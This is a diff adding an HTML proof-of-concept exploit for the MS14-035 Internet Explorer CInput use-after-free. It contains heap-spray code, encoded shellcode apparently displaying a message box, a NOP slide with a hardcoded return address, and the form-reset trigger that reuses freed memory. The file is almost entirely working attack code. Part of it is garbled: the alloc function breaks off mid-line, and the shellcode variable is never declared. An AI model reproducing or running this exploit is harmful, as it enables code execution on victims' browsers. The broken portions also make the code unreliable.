@@ -1,0 +1,109 @@
+
+
+
+<html>
+<head><title>MS14-035 Internet Explorer CInput Use-after-free POC</title></head>
+<body>
+ 
+ 
+ 
+<script>
+    //Fix BSTR spec
+    function alloc(bytes, mystr) {
+        while (mystr.length "Cyber Sphinx!"
+    //--------------------------------------------------------------//
+"%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846" +
+"%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854" +
+"%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac" +
+"%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b" +
+"%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e" +
+"%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff" +
+"%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6" +
+"%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6f68%u5878%u6820" +
+"%u6761%u4265%u4d68%u7365%u3173%u88db%u245c%u890a%u68e3%u2058%u2020%u6868%u6e69" +
+"%u6878%u2072%u7053%u4368%u6279%u3165%u88c9%u244c%u890c%u31e1%u52d2%u5153%uff52" +
+"%u31d0%u50c0%u55ff%u4108"
+ 
+);
+    
+    for (p = 0; p < padding_size; p++){
+    Padding += unescape('%u4242');}
+    
+    for (c = 0; c < block_size; c++){
+if (c == 46){
+// NopSlide += unescape('%u4242%u4242');  // 0x7c348b05
+NopSlide += unescape('%u8b05%u7c34');  // 0x7c348b05
+c++;
+}else
+{
+NopSlide += unescape('%u9090');
+}
+}
+    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
+    
+    var OBJECT = Padding + Shellcode + NopSlide;
+    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
+    
+    var evil = new Array();
+    for (var k = 0; k < 150; k++) {
+        evil[k] = OBJECT.substr(0, OBJECT.length);
+    }
+    
+ 
+</script>
+ 
+ 
+ 
+<form id="testfm">
+<textarea id="child" value="a1" ></textarea>
+<input id="child2" type="checkbox" name="option2" value="a2">Test check<Br>
+<textarea id="child3" value="a2" ></textarea>
+<input type="text" name="test1">
+</form>
+ 
+ 
+ 
+<script>
+ 
+var startfl=false;
+function changer() {
+ 
+ 
+ 
+ 
+// Call of changer function will happen inside mshtml!CFormElement::DoReset call, after execution of this function crash in DoReset will happen when accessing freed CInput element  
+if (startfl) {
+var c = new Array(100);
+for (var a = 0; a < 100; a++)
+{
+c[a] = document.createElement('img');
+}
+document.getElementById("testfm").innerHTML = "";
+ 
+ 
+CollectGarbage();
+//var b1 = unescape("%u0a38%u0c0c");
+var b1 = unescape("%u0c0c%u0c0c");
+for (var a = 4; a < 94; a += 2)
+{
+b1 += "%u4242";
+}
+b = unescape(b1)
+for (var a = 0; a < c.length; a++)
+{
+c[a].title = b;
+}
+   }
+    
+}
+ 
+ 
+document.getElementById("child2").checked = true;
+document.getElementById("child2").onpropertychange=changer;
+startfl = true;
+document.getElementById("testfm").reset(); // DoReset call
+
+ 
+</script>
+</body>
+</html>
